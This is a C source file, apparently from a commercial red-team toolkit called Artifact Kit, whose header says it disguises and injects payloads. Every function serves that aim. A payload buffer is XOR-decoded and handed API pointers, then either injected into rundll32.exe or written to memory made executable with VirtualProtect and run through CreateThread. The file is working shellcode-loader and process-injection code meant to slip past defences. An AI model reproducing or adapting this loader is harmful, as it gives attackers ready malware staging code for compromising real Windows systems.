/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2014 Strategic Cyber LLC
 *
 * See http://www.advancedpentest.com/license
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"

char data[DATA_SIZE] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";

void set_key_pointers(void * buffer) {
	phear * payload = (phear *)data;

	/* this payload does not adhere to our protocol to pass GetModuleHandleA / GetProcAddress to
	   the payload directly. */
	if (payload->gmh_offset <= 0 || payload->gpa_offset <= 0)
		return;

	void * gpa_addr = (void *)GetProcAddress;
	void * gmh_addr = (void *)GetModuleHandleA;

	memcpy(buffer + payload->gmh_offset, &gmh_addr, sizeof(void *));
	memcpy(buffer + payload->gpa_offset, &gpa_addr, sizeof(void *));
}

#ifdef _MIGRATE_
#include "start_thread.c"
#include "injector.c"
void spawn(void * buffer, int length, char * key) {
	int x;
	for (x = 0; x < length; x++) {
		*((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 4];
	}

	/* propagate our key function pointers to our payload */
	set_key_pointers(buffer);

	inject(buffer, length, "rundll32.exe");
}
#else
void run(void * buffer) {
	void (*function)();
	function = (void (*)())buffer;
	function();
}

void spawn(void * buffer, int length, char * key) {
	DWORD old;

	/* allocate the memory for our decoded payload */
	void * ptr = VirtualAlloc(0, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	int x;
	for (x = 0; x < length; x++) {
		char temp = *((char *)buffer + x) ^ key[x % 4];
		*((char *)ptr + x) = temp;
	}

	/* propagate our key function pointers to our payload */
	set_key_pointers(ptr);

	/* change permissions to allow payload to run */
	VirtualProtect(ptr, length, PAGE_EXECUTE_READ, &old);

	/* spawn a thread with our data */
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&run, ptr, 0, NULL);
}
#endif

